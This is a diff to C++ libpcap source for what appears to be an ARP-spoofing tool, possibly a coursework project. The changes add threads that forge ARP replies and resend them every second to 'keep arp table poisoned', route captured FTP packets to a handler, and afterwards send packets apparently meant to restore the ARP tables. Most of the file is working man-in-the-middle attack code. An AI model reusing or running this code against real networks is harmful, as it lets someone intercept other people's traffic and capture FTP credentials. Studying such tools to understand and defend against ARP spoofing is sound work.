@@ -1,8 +1,11 @@
 #include <Pcap.hpp>
 
-pcap_t *g_device = NULL;
+//pcap_t *g_device;
+std::vector<struct s_thread> g_threads;
 std::string g_ip_src;
 std::string g_ip_target;
+std::string g_mac_src;
+std::string g_mac_target;
 unsigned char *g_sll_addr;
 unsigned char g_sll_halen;
 
@@ -320,7 +323,7 @@ static void convAddress(const std::string &src, uint8_t *addr,
 }
 
 static int forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
-	unsigned char *buf, unsigned int len_buf, bool retrieve) {
+	char *buf, unsigned int len_buf, bool retrieve) {
 	const struct ether_header *eth = reinterpret_cast<const struct ether_header *>(bytes);
 	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);
 	struct ether_header eth_cpy;
@@ -345,9 +348,8 @@ static int forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
 			arp_cpy.arp_sha[i] = arp->arp_tha[i];
 		}
 	} else {
-		for (int i = 0; i < ETH_ALEN; i++) {
-			arp_cpy.arp_sha[i] = arp->arp_sha[i];
-		}
+		convAddress(g_mac_target, arp_cpy.arp_sha, ':', ETH_ALEN, 16);
+		g_mac_target = g_mac_src;
 	}
 	convAddress(g_ip_src, arp_cpy.arp_spa, '.', 4, 10);
 	for (int i = 0; i < ETH_ALEN; i++) {
@@ -412,27 +414,69 @@ static int forge_packet_reply(const u_char *bytes, bpf_u_int32 len,
  * Arp poison
  * Resend infinitely to keep arp table poisoned
  */
-static int	send_packet(unsigned char *buf, unsigned int len) {
+static int	send_packet(const char *buf, unsigned int len) {
 	if (!g_device)
 		return -1;
 	std::cout << "SEND PACKET" << std::endl;
 	printf("g:%p\n", g_device);
+//	int res = pthread_create(, NULL, start_routine, buf);
 	return pcap_sendpacket(g_device,
 		(const u_char *)buf, len);
 }
 
+static void start_routine(const char *buf, unsigned int len, int *stop) {
+	printf("sizeof: %lu len: %u\n", sizeof(buf), len);
+	/*if (sizeof(buf) < len) {
+		std::cerr \
+			<< "Arp poison buffer reply is of wrong size, couldn't poison." \
+			<< std::endl;
+		return ;
+	}*/
+	if (g_free_arp == 1) {
+		int res = send_packet(buf, len); // if err display error
+		printf("%d\n", res);
+		if (res == PCAP_ERROR_ACTIVATED
+			|| res == PCAP_ERROR)
+			pcap_perror(g_device, "Error send packet");
+		else if (res == -1)
+			std::cerr << "No device found, can't reply." << std::endl;
+	}
+	while (!g_free_arp) {
+		int res = send_packet(buf, len); // if err display error
+		printf("%d\n", res);
+		if (res == PCAP_ERROR_ACTIVATED
+			|| res == PCAP_ERROR)
+			pcap_perror(g_device, "Error send packet");
+		else if (res == -1)
+			std::cerr << "No device found, can't reply." << std::endl;
+		sleep(1);
+	}
+}
+
 static void handle_arp(const u_char *bytes, bpf_u_int32 len,
 		       bool retrieve) {
-	unsigned char buf[BUFFER_SIZE] = { 0 };
+	char buf[BUFFER_SIZE] = { 0 };
 	int res = forge_packet_reply(bytes, len, buf, BUFFER_SIZE, retrieve);
+
 	if (res == 1) {
-		res = send_packet(buf, sizeof(buf)); // if err display error
+		printf("bufsize:%lu\n", sizeof(buf));
+		char *cstr = new char [BUFFER_SIZE];
+		//struct s_thread thr;
+
+		memset(cstr, 0, BUFFER_SIZE);
+		std::memcpy(cstr, buf, BUFFER_SIZE);
+		//thr.cstr = cstr;
+		//thr.thread = std::thread(start_routine, cstr, sizeof(buf));
+		g_threads.push_back({std::thread(start_routine,
+					cstr, sizeof(buf), &g_free_arp), cstr});
+		/*res = send_packet(buf, sizeof(buf)); // if err display error
 
 		if (res == PCAP_ERROR_ACTIVATED
 			|| res == PCAP_ERROR)
 			pcap_perror(g_device, "Error send packet: ");
 		else if (res == -1)
 			std::cerr << "No device found, can't reply." << std::endl;
+		*/
 	}
 	std::ofstream old_cout;
 	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);
@@ -538,10 +582,14 @@ void	handler(u_char *user, const struct pcap_pkthdr *h,
 	} else {
 	*/
 	printf("type: %x %x\n", eth->ether_type, ntohs(eth->ether_type));
-	if (eth && ntohs(eth->ether_type) == ETHERTYPE_ARP) { // ARP
-		handle_arp(bytes, h->len, false);
-	} else if (eth && ntohs(eth->ether_type) == ETHERTYPE_IP) { // FTP
-		handle_ftp(bytes, h->len);
+	if (g_free_arp == 0) {
+		if (eth && ntohs(eth->ether_type) == ETHERTYPE_ARP) { // ARP
+			handle_arp(bytes, h->len, false);
+		} else if (eth && ntohs(eth->ether_type) == ETHERTYPE_IP) { // FTP
+			handle_ftp(bytes, h->len);
+		}
+	} else {
+			handle_arp(bytes, h->len, true);
 	}
 	//}
 	std::cout<<"LOOP"<<std::endl;
@@ -552,15 +600,43 @@ int	Pcap::loopPcap(pcap_t *src) {
 
 	if (!src)
 		return -1;
-	g_device = src;
+	//g_device = src;
 	g_ip_src = this->_ip_src;
 	g_ip_target = this->_ip_target;
+	g_mac_src = this->_mac_src;
+	g_mac_target = this->_mac_target;
 	g_sll_addr = this->_sll_addr;
 	g_sll_halen = this->_sll_halen;
 //	int res = pcap_loop(src, INFINITE, handler, NULL);
 	int res = pcap_loop(src, INFINITE, handler, NULL);
-	return res;
 
+	if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
+		pcap_perror(src, "Error capturing packets:");
+		return res;
+	}
+	for (s_thread& thr : g_threads) {
+		if (thr.thread.joinable() == true) {
+			thr.thread.join();
+			delete [] thr.cstr;
+		}
+	}
+	g_threads.clear();
+	this->forgePacketRequest(true);
+	this->sendPacket();
+	this->forgePacketRequestSrc(true);
+	this->sendPacket();
+	res = pcap_loop(src, TWO_CAPTURE, handler, NULL);
+	if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
+		pcap_perror(src, "Error capturing packets:");
+	}
+	for (s_thread& thr : g_threads) {
+		if (thr.thread.joinable() == true) {
+			thr.thread.join();
+			delete [] thr.cstr;
+		}
+	}
+	g_threads.clear();
+	return res;
 	/*int res = pcap_dispatch(src, INFINITE, handler, NULL);
 
 	if (res == PCAP_ERROR || res == PCAP_ERROR_NOT_ACTIVATED) {
